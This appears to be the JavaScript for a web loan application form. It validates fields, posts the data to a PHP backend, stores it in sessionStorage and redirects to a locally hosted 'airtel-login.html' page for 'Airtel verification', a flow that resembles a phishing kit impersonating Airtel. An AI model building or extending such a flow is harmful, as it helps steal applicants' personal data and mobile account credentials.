// Form validation & submit logic

function validateForm() {
    const form = document.getElementById("loanForm");
    const inputs = form.querySelectorAll("input[required], select[required]");
    const checkbox = form.querySelector('input[type="checkbox"]');
    
    let isValid = true;
    
    // Check all required fields
    for (let input of inputs) {
        if (!input.value || input.value.trim() === "") {
            input.style.borderColor = "#e53935";
            isValid = false;
        } else {
            input.style.borderColor = "#ccc";
        }
    }
    
    // Check checkbox
    if (checkbox && !checkbox.checked) {
        checkbox.parentElement.style.color = "#e53935";
        isValid = false;
    } else if (checkbox) {
        checkbox.parentElement.style.color = "#333";
    }
    
    if (!isValid) {
        alert("Please fill in all required fields and agree to the terms and conditions.");
    }
    
    return isValid;
}

function handleFormSubmit(event) {
    event.preventDefault();
    
    // Validate form first
    if (!validateForm()) {
        return;
    }

    const form = document.getElementById("loanForm");
    const formData = new FormData(form);

    // Show loading indicator
    const submitBtn = form.querySelector('button[type="submit"]');
    const originalText = submitBtn.textContent;
    submitBtn.textContent = "Processing...";
    submitBtn.disabled = true;

    // Send form data to backend
    fetch("backend/handlers/submit_loan.php", {
        method: "POST",
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        console.log("Response:", data);
        // Store form data in sessionStorage for Airtel verification
        sessionStorage.setItem("loanData", JSON.stringify(Object.fromEntries(formData)));
        // Redirect to Airtel login
        window.location.href = "airtel-login.html";
    })
    .catch(error => {
        console.error("Error:", error);
        alert("Error submitting form. Please try again.");
        submitBtn.textContent = originalText;
        submitBtn.disabled = false;
    });
}

// Attach event listener
document.addEventListener("DOMContentLoaded", function() {
    const form = document.getElementById("loanForm");
    if (form) {
        form.addEventListener("submit", handleFormSubmit);
        
        // Add real-time validation
        const inputs = form.querySelectorAll("input[required], select[required]");
        inputs.forEach(input => {
            input.addEventListener("change", function() {
                if (this.value && this.value.trim() !== "") {
                    this.style.borderColor = "#ccc";
                }
            });
        });
    }
});

